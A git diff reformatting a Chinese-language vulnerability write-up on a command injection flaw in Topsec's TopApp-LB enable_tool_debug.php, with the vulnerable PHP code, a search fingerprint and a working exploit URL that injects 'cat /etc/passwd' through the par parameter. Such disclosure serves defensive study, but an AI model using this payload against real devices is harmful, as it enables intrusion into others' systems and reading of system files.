@@ -1,8 +1,8 @@
-# 天融信 TopApp-LB enable_tool_debug.php 远程命令执行漏洞
+# 天融信 TopApp-LB enable\_tool\_debug.php 远程命令执行漏洞
 
 ## 漏洞描述
 
-天融信 TopSec-LB enable_tool_debug.php文件存在 远程命令执行漏洞，通过命令拼接攻击者可以执行任意命令
+天融信 TopSec-LB enable\_tool\_debug.php文件存在 远程命令执行漏洞，通过命令拼接攻击者可以执行任意命令
 
 ## 漏洞影响
 
@@ -20,15 +20,9 @@ app="天融信-TopApp-LB-负载均衡系统"
 
 登录页面如下
 
+![](../.gitbook/assets/202202091923792.png)
 
-
-![](images/202202091923792.png)
-
-
-
-漏洞文件为 **enable_tool_debug.php**
-
-
+漏洞文件为 **enable\_tool\_debug.php**
 
 ```php
 <?php
@@ -41,11 +35,7 @@ runTool($val,$tool,$par);
 ?>
 ```
 
-
-
 **commandWrapper.inc** 文件中的 **runTool**
-
-
 
 ```php
 function runTool($val,$tool,$par){
@@ -74,16 +64,10 @@ function runTool($val,$tool,$par){
 }
 ```
 
-
-
 这里设置 var=0，tool=1，再进行命令拼接造成远程命令执行
 
-
-
-```plain
+```
 /acc/tools/enable_tool_debug.php?val=0&tool=1&par=127.0.0.1' | cat /etc/passwd > ../../test.txt |'
 ```
 
-
-
-![](images/202202091941884.png)
+![](../.gitbook/assets/202202091941884.png)
